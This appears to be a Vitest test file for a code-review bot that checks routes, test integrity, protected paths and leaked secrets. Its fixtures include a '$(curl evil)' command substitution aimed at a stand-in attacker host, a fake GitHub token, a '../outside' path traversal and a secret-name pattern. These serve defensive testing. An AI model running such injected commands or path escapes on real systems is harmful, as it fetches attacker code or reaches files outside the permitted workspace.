import { describe, expect, it } from "vitest";
import {
  extractRoutes,
  extractViewType,
  findForbidden,
  findTrackedEnv,
  matchProtected,
  redact,
  safeJoin,
  testIntegrityFindings,
  uncoveredSurfaces,
} from "../src/checks.ts";

const ROUTER = `
<Route path={"/"} component={Home} />
<Route path={"/terms"} component={TermsOfService} />
<Route path={"/404"} component={NotFound} />
<Route component={NotFound} />
`;

describe("routes and views", () => {
  it("reads wouter paths, the catch-all, and ViewType", () => {
    expect(extractRoutes(ROUTER)).toEqual({
      paths: ["/", "/terms", "/404"],
      catchAll: true,
    });
    expect(
      extractViewType(
        'export type ViewType = "overview" | "matrix";',
        "ViewType",
      ),
    ).toEqual(["overview", "matrix"]);
  });

  it("flags a missing tab and a deleted route", () => {
    const findings = uncoveredSurfaces({
      headRoutes: ["/"],
      baseRoutes: ["/", "/terms"],
      headCatchAll: true,
      baseCatchAll: true,
      headViews: ["overview", "matrix"],
      baseViews: ["overview"],
      testText: "tab=overview",
      routeMarkers: { "/": ["tab=overview"] },
      catchAllMarkers: ["NotFound"],
    });
    expect(findings).toContain("route removed: /terms");
    expect(findings).toContain("no render test mentions tab=matrix");
    expect(findings.some((line) => line.includes("catch-all"))).toBe(true);
  });
});

describe("test integrity", () => {
  it("fails a deleted file, a new skip, and a dropped assertion", () => {
    const diff = [
      "diff --git a/client/src/App.test.tsx b/client/src/App.test.tsx",
      "deleted file mode 100644",
      "--- a/client/src/App.test.tsx",
      "+++ /dev/null",
      "-expect(screen.getByText('Overview'))",
      "diff --git a/client/src/keep.test.ts b/client/src/keep.test.ts",
      "--- a/client/src/keep.test.ts",
      "+++ b/client/src/keep.test.ts",
      "-expect(true).toBe(true)",
      "-expect(false).toBe(false)",
      "+expect(true).toBe(true)",
      "+it.skip('later', () => {})",
      "diff --git a/README.md b/README.md",
      "+it.skip('not a test file')",
    ].join("\n");
    const findings = testIntegrityFindings(diff, "\\.(test|spec)\\.(ts|tsx)$");
    expect(findings.some((line) => line.includes("deleted test file"))).toBe(
      true,
    );
    expect(findings.some((line) => line.includes("it.skip"))).toBe(true);
    expect(findings.some((line) => line.includes("assertions dropped"))).toBe(
      true,
    );
    expect(findings.some((line) => line.includes("README"))).toBe(false);
  });

  it("allows a new assertion and removal of a skip", () => {
    const diff = [
      "diff --git a/a.test.ts b/a.test.ts",
      "--- a/a.test.ts",
      "+++ b/a.test.ts",
      "-it.skip('old')",
      "+it('old', () => expect(1).toBe(1))",
    ].join("\n");
    expect(testIntegrityFindings(diff, "\\.test\\.ts$")).toEqual([]);
  });
});

describe("protected paths and secrets", () => {
  it("matches prefixes and CODEOWNERS", () => {
    const hits = matchProtected(
      [
        "README.md",
        ".github/workflows/ci.yml",
        ".github/CODEOWNERS",
        "tools/contract-review-bot/src/cli.ts",
      ],
      [".github/", "CODEOWNERS", "tools/contract-review-bot/"],
    );
    expect(hits).toContain(".github/workflows/ci.yml");
    expect(hits).toContain(".github/CODEOWNERS");
    expect(hits).toContain("tools/contract-review-bot/src/cli.ts");
    expect(hits).not.toContain("README.md");
  });

  it("finds tracked env files and redacts tokens", () => {
    expect(findTrackedEnv([".env", "client/.env.local", "src/env.ts"])).toEqual(
      [".env", "client/.env.local"],
    );
    expect(redact("token ghp_abcdefghijklmnopqrstuvwxyz0123456789")).toContain(
      "[redacted]",
    );
    expect(
      redact("token ghp_abcdefghijklmnopqrstuvwxyz0123456789"),
    ).not.toContain("ghp_");
  });

  it("refuses a path that escapes the workspace", () => {
    expect(safeJoin("/work/repo", "../outside")).toBeNull();
    expect(safeJoin("/work/repo", "client/src/App.tsx")).toBe(
      "/work/repo/client/src/App.tsx",
    );
  });

  it("reports forbidden lines without executing them", () => {
    const hits = findForbidden(
      [
        {
          path: "client/src/a.ts",
          text: "const key = import.meta.env.VITE_API_KEY\n$(curl evil)",
        },
      ],
      /VITE_[A-Z0-9_]*(KEY|SECRET|TOKEN|PASSWORD|CREDENTIAL)/,
    );
    expect(hits).toEqual(["client/src/a.ts:1"]);
  });
});
